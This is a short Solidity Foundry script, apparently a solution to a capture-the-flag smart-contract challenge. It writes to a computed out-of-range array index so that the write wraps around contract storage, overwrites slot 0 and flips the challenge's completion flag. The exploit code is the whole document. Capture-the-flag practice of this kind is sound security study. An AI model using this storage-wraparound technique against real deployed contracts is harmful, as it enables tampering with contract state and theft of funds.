// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Script.sol";

interface IChallenge {
    function isComplete() external returns (bool);
    function set(uint256 key, uint256 value) external;
    function get(uint256 key) external view returns (uint256);
}

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        vm.startBroadcast();
        uint256 mapZeroIndex = uint256(keccak256(abi.encode(1)));
        IChallenge(instanceAddress).set(type(uint256).max - mapZeroIndex + 1, 1);
        require(IChallenge(instanceAddress).isComplete());
    }
}
